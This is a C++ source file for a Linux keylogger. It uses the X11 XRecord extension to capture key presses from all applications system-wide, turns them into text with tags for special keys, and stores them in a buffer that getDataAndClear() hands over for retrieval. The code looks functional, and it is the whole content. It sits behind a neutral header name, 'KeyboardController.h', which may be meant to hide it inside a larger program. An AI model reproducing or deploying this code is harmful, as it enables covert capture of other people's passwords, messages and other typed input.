#include "KeyboardController.h"
#ifdef __linux__

std::string Keylogger::_buffer = "";
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false), x11Display(0) {}

Keylogger::~Keylogger() {
    Stop();
}

void Keylogger::append(const std::string& str) {
    std::lock_guard<std::mutex> lock(_mtx);
    _buffer += str;
}

static Keylogger* g_keylogger = nullptr;

void Keylogger::LinuxLoop() {
    Display* display = XOpenDisplay(NULL);
    if (!display) {
        fprintf(stderr, "[Keylogger] Failed to open X display. Check X11 permissions!\n");
        return;
    }

    x11Display = (int)(intptr_t)display;
    g_keylogger = this;

    XRecordContext context;
    XRecordRange* range = XRecordAllocRange();
    if (!range) {
        XCloseDisplay(display);
        return;
    }

    range->device_events.first = KeyPress;
    range->device_events.last = KeyRelease;

    XRecordClientSpec clientSpec = XRecordAllClients;
    context = XRecordCreateContext(display, 0, &clientSpec, 1, &range, 1);
    if (!context) {
        XFree(range);
        XCloseDisplay(display);
        return;
    }

    XFree(range);

    Display* dataDisplay = XOpenDisplay(NULL);
    if (!dataDisplay) {
        XRecordFreeContext(display, context);
        XCloseDisplay(display);
        return;
    }

    if (!XRecordEnableContext(dataDisplay, context, 
        [](XPointer priv, XRecordInterceptData* data) {
            if (data->category == XRecordFromServer) {
                xEvent* event = (xEvent*)data->data;
                if (event->u.u.type == KeyPress) {
                    KeySym keysym = XLookupKeysym(&event->u.keyButtonPointer, 0);
                    
                    if (keysym == XK_Return) g_keylogger->append("\n");
                    else if (keysym == XK_Tab) g_keylogger->append("[TAB]");
                    else if (keysym == XK_space) g_keylogger->append(" ");
                    else if (keysym == XK_BackSpace) g_keylogger->append("[BACK]");
                    else if (keysym == XK_Escape) g_keylogger->append("[ESC]");
                    else if (keysym == XK_Shift_L || keysym == XK_Shift_R) {}
                    else if (keysym == XK_Control_L || keysym == XK_Control_R) g_keylogger->append("[CTRL]");
                    else if (keysym == XK_Alt_L || keysym == XK_Alt_R) g_keylogger->append("[ALT]");
                    else {
                        char buffer[2] = {0};
                        if (XLookupString(&event->u.keyButtonPointer, buffer, sizeof(buffer), NULL, NULL) > 0) {
                            if (buffer[0] >= 32 && buffer[0] <= 126) {
                                g_keylogger->append(std::string(1, buffer[0]));
                            }
                        }
                    }
                }
            }
            XRecordFreeData(data);
        }, NULL)) {
        XRecordFreeContext(display, context);
        XCloseDisplay(dataDisplay);
        XCloseDisplay(display);
        return;
    }

    while (_isRunning) {
        XRecordProcessReplies(dataDisplay);
        XFlush(dataDisplay);
        usleep(10000);
    }

    XRecordDisableContext(dataDisplay, context);
    XRecordFreeContext(display, context);
    XCloseDisplay(dataDisplay);
    XCloseDisplay(display);
    x11Display = 0;
}

void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    _workerThread = std::thread([this]() {
        this->LinuxLoop();
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    if (_workerThread.joinable()) {
        _workerThread.join();
    }
}

std::string Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx);
    if (_buffer.empty()) return "";
    std::string dataCopy = _buffer;
    _buffer.clear();
    return dataCopy;
}

#endif
